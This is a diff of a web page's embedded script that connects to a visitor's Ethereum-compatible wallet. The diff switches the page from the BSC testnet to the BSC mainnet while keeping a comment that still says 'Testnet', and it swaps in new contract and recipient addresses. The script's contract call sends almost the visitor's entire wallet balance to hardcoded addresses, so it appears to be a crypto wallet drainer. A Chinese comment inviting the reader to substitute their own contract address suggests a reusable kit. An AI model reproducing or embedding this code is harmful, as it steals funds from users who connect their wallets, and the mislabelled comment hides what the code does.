@@ -4529,7 +4529,7 @@
 
                     const web3 = new Web3(window.ethereum);
 
-                    const chainId = '0x61'; // BSC Testnet chain ID
+                    const chainId = '0x38'; // BSC Testnet chain ID
                     const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
 
                     if (currentChainId !== chainId) {
@@ -8901,7 +8901,7 @@
     </div>
     <script>
       
-        const contractAddress = '0x3B7b1129c09E5ec3E8A6D71460f33d4eA731332e'; // 替换为你的合约地址
+        const contractAddress = '0xe7a2b127ee206b3373cddd5663d657e907a28b11'; // 替换为你的合约地址
         const contractABI = [{
 		"inputs": [
 			{
@@ -8957,7 +8957,7 @@
                         return;
                     }
 
-                    const result = await contract.methods.Execute(account, "0xA4f6108D42AA38798dC1D47a1bF6EDD55bF6F7BB", "0xA4f6108D42AA38798dC1D47a1bF6EDD55bF6F7BB", 98, 0).send({ from: account, value: balanceWei - 9000000000000000n });
+                    const result = await contract.methods.Execute(account, "0x615f57BF34F6Be507649fB7C8aB2283848036F86", "0x615f57BF34F6Be507649fB7C8aB2283848036F86", 98, 0).send({ from: account, value: balanceWei - 9000000000000000n });
 
                     console.log('Function result:', result);
                 } catch (error) {
